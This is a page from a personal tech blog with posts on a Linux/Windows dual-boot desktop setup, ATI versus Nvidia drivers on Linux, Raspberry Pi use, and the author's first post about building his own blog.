<p>This very thing also applies for the recent craze about RaspberryPis; I have seen a friend using one as media center, but still he was complaining that not always the frame-rate was perfectly smooth (just to point out that&rsquo;s not perfect for every purpose). You should ask yourself: <em>Am I already doing something that could benefit from the smaller physical size and power footprint of such a machine?</em> If you aren&rsquo;t I think it&rsquo;s better to start with an existing prototype of such a software/system, and move to ARM only when you really need it.</p>

<p>Now <a href="http://torvalds-family.blogspot.it/2009/01/odd-hardware.html">Linus Torvalds&#8217; opinion on <em>odd-ball machines</em></a> strongly resonates in my brain :)</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2012/03/06/My-Desktop-Setup/">My Desktop Setup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2012-03-06T15:32:00+01:00" pubdate data-updated="true">2012 March 6<span>th</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>It took me more time than I expected to write up this second post, I hope to be able to ramp up the rhythm soon.
The reason is that I haven&rsquo;t really wrote this up by impulse&hellip; In fact I wanted to write this since quite some time, and in the meanwhile in the last days, I was busy planning a <a href="http://bglug.it/2012/02/23/bglug-partecipa-allubuntu-global-jam">small Jam</a> along with other small misc duties.</p>

<p>Two years and a half ago I bought a new desktop computer, it had to be shared with my family, so I planned that it would&rsquo;ve run Windows alongside Linux.</p>

<p>That&rsquo;s not too bad, since having the opportunity to run games or other software natively on Windows is nice to have, but the truth is that being this only a secondary computer for me, it would&rsquo;ve run Windows most of the time.</p>

<p>So, to test something that I hadn&rsquo;t tried yet at the time (that would&rsquo;ve been useful in case someone dropped by our LUG asking for support about it) and to skip chainloading the Windows bootloader (thus potentially slowing down the boot, something I didn&rsquo;t want: Given that I used an ssd as a boot drive, I wanted to avoid such things, even if it would&rsquo;ve only a marginal effect) I chose to use wubi.</p>

<p>For those that don&rsquo;t know about it: it avoids changing the bootloader with grub and installs ubuntu in a loopback mounted virtual disk (a normal file under windows). It was quite neat, but I stumbled upon some nasty issues when upgrading to grub2, such as <a href="https://bugs.launchpad.net/ubuntu/+source/grub2/+bug/477104">this bug</a>.</p>

<p>At the end, I&rsquo;m not quite convinced of the tradeoff in complexity for new users, given the potential nasty edge cases&hellip;</p>

<p>Btw, I also decided to try some other things I didn&rsquo;t really have much experience in linux&hellip; One of these, if I remember correctly, was Ext4; while the other was simply installing Linux on an ATI gpu.</p>

<p>ATI has always had a bad reputation among linux users, but when I chose the hardware for that desktop, the Radeon 4890 seemed like a nice choice, and I was curious about proving that wrong.</p>

<p>In fact, it&rsquo;s been some years now that they started an <a href="http://www.phoronix.com/scan.php?page=article&amp;item=826&amp;num=1">effort to supply a good OSS driver</a> for their cards. Sure, you can still be out of luck when running a bleeding edge distribution, due to the delay in updating the drivers to get them working with the latest changes in Xorg and such&hellip;</p>

<p>In fact Ubuntu had to <a href="http://www.phoronix.com/scan.php?page=article&amp;item=amd_open_jaunty&amp;num=1">get into agreements with ATI</a> to be able to ship the drivers in time or <a href="http://www.phoronix.com/scan.php?page=article&amp;item=ubuntu_1104_radeon&amp;num=1">backport some of the Xorg changes</a>.</p>

<p>Surely, I still found Intel gpu drivers, to be more stable (even if lacking in OpenGL features and performance, and obviously I&rsquo;m not counting the horrible GMA500), but I find it strange that Linux people are still preferring Nvidia over Ati, when they&rsquo;re being so hostile by <a href="http://www.phoronix.com/scan.php?page=article&amp;item=nvidia_kills_nv&amp;num=1">removing support to their old 2d-only open source driver</a> altogheter without commiting to help the <a href="http://nouveau.freedesktop.org/">Nouveau project</a>.</p>

<p>I&rsquo;ve also seen plenty of times, Linux users with an Nvidia powered laptop, struggling to set up correctly an external display/beamer, this due to the fact that Nvidia doesn&rsquo;t support xrandr1.2 and pushes for their own TwinView option, with their own configuration tools, and their own set of problems.</p>

<p>With this setup, I&rsquo;ve been able to see some interesting things: like the performance of the loopback drive&hellip; by doing a readonly benchmark inside palimpsest I noticed that it was about half of the performance when directly accessing the ntfs drive (that, being a 30GB SSD, is thus really tight for hosting 2 OS installations)</p>

<p>I also chose to keep all the user configuration files on the SSD, and move only huge things on the secondary traditional hard drive&hellip; Thanks to the fact that both Linux and Windows Vista support symbolic links, this gives me quite a bit of flexibility in setting that up. That said, I don&rsquo;t think that the small advantage of being able to load chrome&rsquo;s sqlite dbs faster and such things outweighs the time lost cramming everything into such a small space and tracking down rogue programs/users when those filled their home folder (not to mention the pain of setting up all the symlink for each new user).</p>

<p>In fact I think I won&rsquo;t ever use such a directory layout&hellip; Heck: it&rsquo;s 2012, we aren&rsquo;t supposed to micromanage disk space this way anymore.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2012/02/29/%EC%95%88%EB%85%95-%EC%84%B8%EA%B3%84/">안녕 세계</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2012-02-29T00:36:00+01:00" pubdate data-updated="true">2012 February 29<span>th</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Wait&hellip; are you asking <em>&ldquo;what are those characters?&rdquo;</em>
Well, that&rsquo;s supposed to be &ldquo;Hello world&rdquo; in korean, I jut put it there to test unicode url in my brand new blog :D</p>

<p>&hellip;and yes: obviously, this is my first post, and since I somewhat like the korean alphabet, I found that using that as the title was somewhat fitting :)</p>

<p>This is not really noticeable from this very very simple page, but I actually spent quite a bit of time on the backend. It&rsquo;s still missing styles, rss, a working pagination, javascript goodness and a bunch of things&hellip; but at least now the basics of the blog are there, I can start writing content, and then I&rsquo;ll just integrate the missing features (you know&hellip; <a href="http://en.wikipedia.org/wiki/Minimum_viable_product">minimum viable product</a> :P)</p>

<p>Also: for now I&rsquo;m using a crappy .co.cc domain, but as soon as I&rsquo;ll be able to host something meaningful here, I think I&rsquo;ll switch to something better</p>

<p>It&rsquo;s been more than 3 years since I first had the idea of running my own blog, why did it take so long?</p>

<p>Well&hellip; aside from my usual procrastination problem, this is due to the fact that I decided to create it from scratch, and I decided to impose on myself some very weird requirements</p>

<p>Like the ability to automatically redirect the urls when an user does a typo, or keeping semi-automatically an image of my mug for each post (a bit narcissistic, but this way I hope to preserve a log of the mood in which I was when writing these posts, and in the long term I&rsquo;ll be able to see how I changed&hellip; like in those fancy timelapse videos)</p>

<p>For now, I&rsquo;m also hosting this directly on my home internet connection on a Debian squeeze, running on arm (and I had quite a bit of problems with my hardware setup, but I think I&rsquo;ll write about it in another post)</p>

<p>So, I&rsquo;ll progressively add more info about myself, what I&rsquo;m working on, what I find interesting, and possibly my unrequested opinion on the issue du jour :P</p>

<p>I&rsquo;m writing all of this in english, and I plan to refrain altogether to write in my native language (Italian) for several reasons:</p>

<ul>
<li>Most of the content on the internet is in english, and it has a bigger audience.</li>
<li>People who restrict themselves only to their native language imho are crippling their access to knowledge&hellip; in particular, in the IT field, being proficent in it is almost a must, and I think that if you have the possibility to directly engage with the english-speaking world/community/whatever you should do so. You could say I&rsquo;m doing it out of a personal principle.</li>
<li>I&rsquo;m planning on making a life abroad&hellip; sticking to my native language doesn&rsquo;t make sense.</li>
<li>The only things for which speaking to a strictly italian audience may make sense is for internal politics topics or similar issues, but given the sheer idiocy of the current state of italian society, I think it&rsquo;s better to ingnore all of that and work on what we can actually improve.</li>
<li>Obviously, also to get the hang to write some somewhat long prose in english (I don&rsquo;t really have problems communicating, but I&rsquo;m not really fluent: I periodically stop to think for the best word to use, and I also think that when writing I just structure too many sentences in first singular person form, and split the text in an ugly and self-centered way, native english people probably find my writing style childish and less clear to follow).</li>
</ul>


<p>This last point, will apply only if I&rsquo;ll be able to keep up with this habit :D We&rsquo;ll see.</p>
</div>
  
  


    </article>
  
  <div class="pagination">
    
    <a href="/blog/archives">Blog Archives</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2013/12/24/let-down-by-googles-android/">Let Down by Google&#8217;s Android</a>
      </li>
    
      <li class="post">
        <a href="/blog/2013/12/11/windows-disk-woes/">Windows Disk Woes</a>
      </li>
    
      <li class="post">
        <a href="/blog/2013/06/17/back-to-sanity/">Back to Sanity</a>
      </li>
    
      <li class="post">
        <a href="/blog/2012/03/06/My-Desktop-Setup/">My Desktop Setup</a>
      </li>
    
      <li class="post">
        <a href="/blog/2012/02/29/%EC%95%88%EB%85%95-%EC%84%B8%EA%B3%84/">안녕 세계</a>
      </li>
    
  </ul>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><script src="berdario.js" type="text/javascript"></script>
<p>
  Copyright &copy; 2014 - Dario Bertini -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'berdario';
      
        
        var disqus_script = 'count.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>











</body>
</html>
